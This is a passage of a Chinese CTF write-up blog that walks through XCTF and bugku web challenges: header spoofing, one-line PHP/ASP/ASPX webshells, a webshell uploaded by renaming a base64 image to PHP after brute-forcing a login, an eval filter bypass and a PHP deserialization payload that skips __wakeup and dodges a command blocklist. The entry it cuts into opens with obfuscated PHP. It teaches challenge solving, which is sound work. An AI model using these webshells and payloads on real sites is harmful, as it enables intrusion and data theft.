<p>首先提示我们需要对他发送一个get请求，我们构造a=1进行发送get请求，然后返回结果</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/KHYZ%25IH3%28%600JE%40WMM%28PIVCU.png" alt=""></p>
<br>
<p>我们再用curl发送post请求，也可使用其他工具，这里使用windows自带的curl。不懂curl如何使用的兄弟可移步到我的另一篇博文</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/H6LU%60WBN%5DX2ZGGFUCM3~60V.png" alt=""></p>
<br>
<p>返回的结果中含有flag，ok，此题通关！</p>
</li>
<li>
<h2 id="xff-referer"><a class="header-anchor" href="#xff-referer">¶</a>xff_referer</h2>
<hr>
<p>题目告诉我们是xff_referer，猜测是与xff和referer相关，打开环境看看</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/3N%5DA%7D%5DDIH~K4SN8%5B%299CDX0Y.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/A_0D%40SG%28AGK0VCPC1%401N~UE.png" alt=""></p>
<br>
<p>我们先学习一下xff和referer的知识：</p>
<p>（1）<strong>X-Forwarded-For:</strong>  简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。xff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</p>
<p>（2）<strong>HTTP Referer:</strong>  是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是<em>从哪个页面链接过来</em>的，服务器基此可以获得一些信息用于处理。referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</p>
<br>
<p>我们先设置xff为123.123.123.123发送请求包，查看包信息</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/PQ7F0J%5BF%5BQ1IFZ%605C%29_4PV2.png" alt=""></p>
<br>
<p>提示我们地址必须来自https://www.google.com</p>
<p>所以我们加上referer信息</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/6TO%40YJZ5U~~H1O_Z3%40%24X%7DP5.png" alt=""></p>
<p>发现响应包里含有flag，成功！这道题还可以使用我们强大的curl命令行工具</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/M9MHWII6E%2841I0Y8Z%7BB%7DQPW.png" alt=""></p>
</li>
<li>
<h2 id="webshell"><a class="header-anchor" href="#webshell">¶</a>webshell</h2>
<hr>
<p>这道题考的是webshell，诶，你不知道什么是webshell吗？webshell就是web下的shell ，也就是web网站的后门。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/%5D3B~6AJ6BIRTDI62TL%5BH9PY.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/FW8AU7XJALI0HR1%29RZ4%7B%7BQW.png" alt=""></p>
<p>页面已经给出我们shell，也是常用的php一句话木马</p>
<p>同时常用的一句话木马有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
<p>给出连接密码webshell，那我们直接蚁剑连接就好</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/Z5%25II2N4%254R~%29R8DY~%405AN4.png" alt=""></p>
<p>然后连接到后台，在里面找到flag文件，打开获取flag即可~</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/%5DS%244%25EXCQ1PS03D%5B%7DCP5%7DDL.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/Z5%25II2N4%254R~%29R8DY~%405AN4.png" alt=""></p>
</li>
<li>
<h2 id="simple-js"><a class="header-anchor" href="#simple-js">¶</a>simple_js</h2>
<hr>
<p>打开题目，题目名字告诉我们和js有关，这让我着实慌了一会，因为我对js没有怎么去学过。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/%28A4HX0%24I98LMS1_M%60%5BD2OEA.png" alt=""></p>
<p>打开页面后弹出一个输入密码的框，乱输一阵，哈哈嗝。</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/ZX%40BKAX1E%7DD3IZWJ%25%25DQ4IM.png" alt=""></p>
<p>返回一段英文，显示告诉我们这是假密码，我们去找一下有没有东西，诶，发现了！我们尝试审计一下代码</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/K%25%29ZR5%25N%24XC236QA~5FVBMB.png" alt=""></p>
<p>发现定义了一些参数和好像有点多余的for循环，好吧，有点迷，最后一个弹窗也是和前面定义的参数毫无关系。不过发现有个可疑的变量和dechiffre后面跟着的字符串。尝试解码一下pass，这变量名字不错，希望有点用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    print(chr(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/SD%28%5D9%60%7BB%25WGN1%5DS2_%288H8JT.png" alt=""></p>
<p>解码得到弹框的提示消息，那我们再解一下下面那一串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span></span><br><span class="line">  s_list = string.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> s_list:</span><br><span class="line">      i = chr(int(i))</span><br><span class="line">      res += i</span><br><span class="line">  print(res)</span><br></pre></td></tr></table></figure>
<p>看起来不像是什么加密的结构，这让我有点迷。淦，忽然想起来前面题目开始就提示我们flga结构，于是拿着字符串去构造了一下flag提交，Cyberpeace{786OsErtk12}，发现居然成功了~</p>
</li>
</ul>
<h1>高手进阶区</h1>
<ul>
<li>
<h2 id="baby-web"><a class="header-anchor" href="#baby-web">¶</a>baby_web</h2>
<hr>
<p>有点激动，终于到高手web进阶区了，慢慢走向高手的路了是不是？好吧好吧，不吹了，来看看题目</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/2QD4IVBA_IZPP_%2425STG%28%28N.png" alt=""></p>
<p>题目提示我们是初始页面，打开是一个1.php，尝试输入了一下index.php,发现存在这个页面，但302跳转了</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/VC70ZU3IO_B8ZM7Q%28~93O%5DX.png" alt=""></p>
<p>然后使用curl请求一下，curl工具默认不随着302跳转</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/HY40G4%601ZEH%7DEGO2EN%25~498.png" alt=""></p>
<p>flag就出来了，妥妥的签到题呀哈哈嗝。</p>
<p>后来发现其实刚开始就已经给出flag了，汗！</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/YY4%24SZRJG~%7DGSJ%5DHWPE~6XO.png" alt=""></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>新版bugku平台Writeup</title>
    <url>/posts/49040/</url>
    <content><![CDATA[<h1>前言</h1>
<p>前段日子，新版bugku平台改版上线，然后我就兴冲冲的去刷了一波😂<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%60%5DEGP1RJ%5D%7DAC%5D_%5D85OHB%257U.png" alt=""><br>
大部分题还是上线的老bugku平台的题，但也在逐渐上线新题，所以开了个文章记录下新题的做题过程（会慢慢更新）。有大部分web的题我在博客的另一篇文章写过，这里不重复写了，只记录一些想记录的题。<br>
想看的师傅移步到这里https://www.wlhhlc.top/posts/55334/噢。</p>
<h1>Web</h1>
<h2 id="xxx二手交易市场"><a class="header-anchor" href="#xxx二手交易市场">¶</a>xxx二手交易市场</h2>
<p>题目提示是：本人现实碰到的题目，无提示勿问。好家伙，莫非要渗透一波？？<br>
打开是一个购物市场页面<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/G28I_WP%25XFU%2905H%60NC600YM.png" alt=""><br>
浏览完一遍，发现有注册和登录功能。<br>
在登录尝试用admin登录，提示限制得6位以上。准备采取爆破，因为验证码是只是前段验证，爆破是可行的(不过就算不是前段验证，训练一波验证码识别也可以哈哈哈~)<br>
但用户名和密码同时爆破工作量有点大，所以我们去注册页面去尝试爆破注册，看看能否爆破出已经存在的用户名<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/U6CVM4G8VJOZ%5D2CR9KW0LNW.png" alt=""><br>
burpsuite启动！<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/5LVOQBO085X%25U9~Q6KR8%28QP.png" alt=""><br>
爆破出存在用户名123456，接着去登录页面进行爆破，拿到密码为123456<br>
芜湖，登录！✌️<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/QZX%29EN3X%40%7DDW~6FSXD_OU_5.png" alt=""><br>
发现头像是图片文件上传点，然后熟悉的一梭子打下去（图片马，抓包）<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/T0RM~~4R%24AQSD2R6_814M0D.png" alt=""><br>
发现我们传送的数据是base64的数据流，我们去写一句话木马，然后base64编码<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/XN97XRJKMI%28EO%25H%256YFLQ%7DC.png" alt=""><br>
把拦截的图片数据改成经过base64编码后的一句话木马，并且把前面的jpeg改成php，gogogo！<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/7%7BJU8%7B2U%40VT5DZ44%5BUMU%25UE.png" alt=""><br>
上传成功，蚁剑启动！<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/QQ%E6%88%AA%E5%9B%BE20201230103931.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/79IMCM%5DG~E%60B5%29%5BERZWUL2B.png" alt=""><br>
flag成功拿到，收工。</p>
<h2 id="冬至红包"><a class="header-anchor" href="#冬至红包">¶</a>冬至红包</h2>
<p>至今仍不知道那天的红包有多大<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/1%5D%60_N%29%5DP4Q%28M%29%40D4I7B%5B153.png" alt=""><br>
打开题目，一段php代码，考绕过的功底了<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/1NYXWXRZ8%7DG%5B57CFJ%28YMLN8.png" alt=""><br>
首先审计一下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    $exam = <span class="string">&#x27;return\&#x27;&#x27;</span>.sha1(time()).<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./?flag=&#x27;</span>.$exam.<span class="string">&#x27;&quot;&gt;Click here&lt;/a&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">&#x27;flag&#x27;</span>]) != strlen($exam)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;长度不允许&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/`|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is&#x27;</span>, $_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;关键字不允许&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) === sha1($flag)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;马老师发生甚么事了&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第一个if：判断是否传参变量flag，没有就输出$exam和一些html<br>
第二个if：判断flag变量的长度是否和$exam的长度相等<br>
第三个if：过滤一些关键字符<br>
第四个if：eval执行flag变量里面的内容，并且要等于flag变量的SHA-1散列</p>
</blockquote>
<p>这里我实在是不知道是如何能执行后等于sha1值，我觉得题目考点也不在这。所以我们采取绕过的形式，可以看到相等后会输出flag.php里面变量$flag的值，而现在又可以执行我们传入的flag变量内容，所以我们直接构成语句达到输出$flag的目的<br>
为了绕过flag过滤，我们可以使用php中$$引用变量的特性和php短写标签的特性</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//$$变量使用</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    $$a = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $$a.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $abc;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*输出值分别如下：</span></span><br><span class="line"><span class="comment">abc</span></span><br><span class="line"><span class="comment">100</span></span><br><span class="line"><span class="comment">100</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//php短标签特性</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.&lt;?php echo &quot;abc&quot;?&gt;</span></span><br><span class="line"><span class="comment">2.&lt;?=&quot;abc&quot;;?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">上面两个语句都是输出abc</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们先点击clickhere获取$exam的值:<br>
flag=return’5e22e75193f17cf3e608058536d49e4a7fd7dc56’;<br>
所以$exam=return’5e22e75193f17cf3e608058536d49e4a7fd7dc56’;<br>
构造url如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?flag&#x3D;$w&#x3D;blag;$w&#123;0&#125;&#x3D;f;?&gt;888888888888888888888;&lt;?&#x3D;$$w;?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/MB%29%40%283X4J_ZZ%7B6SDWZ%401DTU.png" alt=""><br>
成功拿到flag，就是没红包了呜呜呜。</p>
<h2 id="安慰奖"><a class="header-anchor" href="#安慰奖">¶</a>安慰奖</h2>
<p>打开页面，返回一个空白页面，御剑启动!⚡️<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/%295N%7B4KOUA3%7DZI%28R%40JN~7V84.png" alt=""><br>
扫描到存在index.php.bak文件，应该是备份文件，下载下来，打开得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$cmd</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            $a = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $select = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>题型是反序列化，首先需要get传参code<br>
我们先了解一下常见的php魔术方法：</p>
<blockquote>
<p>__construct() 创建对象时调用<br>
__destruct() 销毁对象时调用<br>
__toString() 当一个对象被当作一个字符串使用<br>
__sleep() 在对象在被序列化之前运行<br>
__wakeup 将在序列化之后立即被调用</p>
</blockquote>
<p>访问控制修饰符：</p>
<blockquote>
<p>public(公有)<br>
protected(受保护)<br>
private(私有的)<br>
protected属性被序列化的时候属性值会变成：%00*%00属性名<br>
private属性被序列化的时候属性值会变成：%00类名%00属性名</p>
</blockquote>
<p>分析源码<br>
首先初始化ctf类的时候会创建两个变量，username和cmd，满足username=admin的时候就会输出cmd的类型与值<br>
所以我们构建如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$cmd</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            $a = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> ctf(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行后得到：<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/1%40O68EH%60IO%7D%252WRXFXJ4%29%29L.png" alt=""><br>
即O:3:“ctf”:2:{s:11:&quot; * username&quot;;s:5:“admin”;s:6:&quot; * cmd&quot;;s:2:“ls”;}<br>
<strong>注意</strong>：<br>
我们需要绕过_wakeup()，就得把2写成3，当代表变量个数的数字大于实际真实值时就会绕过这个函数，否则username变量会被覆盖成guest，而不是admin。<br>
还有一点，就是前文提到的，protected属性被序列化的时候属性值会变成：%00*%00属性名<br>
所以payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;O:3:&quot;ctf&quot;:3:&#123;s:11:&quot;%00*%00username&quot;;s:5:&quot;admin&quot;;s:6:&quot;%00*%00cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/RMGXZVYRXISXL9%60J981BXV4.png" alt=""><br>
可以看见有flag.php文件，我们再cat读取一下，因为这里过滤了cat，所以我们改成ca\t flag.php<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/9DY%28%7B74VIOO~Z2%24DMDYJU4T.png" alt=""><br>
在源码里找到flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/O6%24T%60B%7BV6%24%5D2FR2%60%7D4%5D%7B_U9.png" alt=""><br>
当然也可以使用tac命令<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/O%25ARZ%5D4%40653A5%28L5A9%5BJGR7.png" alt=""></p>
<h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2>
<p>打开，看到一堆被混淆过后的php源码😤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&#x27;pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ = urldecode(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">3</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">6</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">33</span>&#125; . 